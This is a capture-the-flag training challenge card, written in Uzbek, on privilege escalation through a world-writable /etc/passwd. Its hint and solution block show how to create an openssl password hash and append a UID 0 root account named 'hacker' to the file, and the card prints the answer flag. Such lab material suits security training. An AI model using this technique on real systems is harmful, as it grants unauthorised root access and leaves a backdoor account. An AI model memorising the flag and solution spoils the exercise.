---
id: 17
title: "CH17: Writable /etc/passwd Root Ingestion"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 7
tags: ['passwd', 'misconfig', 'root-account', 'privesc']
flag: "HD{passwd_writable_root_insertion_master_917}"
---

# 🎯 Topshiriq #17: CH17: Writable /etc/passwd Root Ingestion

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 7 ball`
* **Teglar:** #passwd, #misconfig, #root-account, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
/etc/passwd fayli ruxsatida xatolik tufayli hamma uchun yozishga ruxsat bor (rw-rw-rw-). Yangi 0-UID li root foydalanuvchisini qo'shing.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> openssl passwd -1 -salt pwn pwnpass -> 'hacker:$1$pwn$...:0:0:root:/root:/bin/bash' ni /etc/passwd ga qo'shing.

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
openssl passwd -1 -salt pwn pwnpass -> 'hacker:$1$pwn$...:0:0:root:/root:/bin/bash' ni /etc/passwd ga qo'shing.
```

---

## 🚩 Maxfiy Flag:
`HD{passwd_writable_root_insertion_master_917}`
